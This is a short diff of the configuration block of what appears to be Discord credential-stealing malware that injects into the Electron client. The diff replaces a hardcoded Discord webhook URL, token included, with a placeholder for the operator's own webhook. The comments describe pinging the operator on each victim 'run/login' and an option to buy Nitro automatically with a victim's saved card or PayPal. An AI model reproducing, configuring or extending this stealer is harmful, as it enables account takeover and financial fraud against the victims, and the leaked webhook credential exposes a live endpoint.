@@ -6,7 +6,7 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  webhook: "https://discord.com/api/webhooks/1004350064250073149/I-2QS3SM9QsRUsyXiNiJWaCQQlVl8hO-ZSA4IAOFLQ3sxUpyxeiyGiaBOES2zj6YLqPT", //your discord webhook there obviously
+  webhook: "%webhook%", //your discord webhook there obviously
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
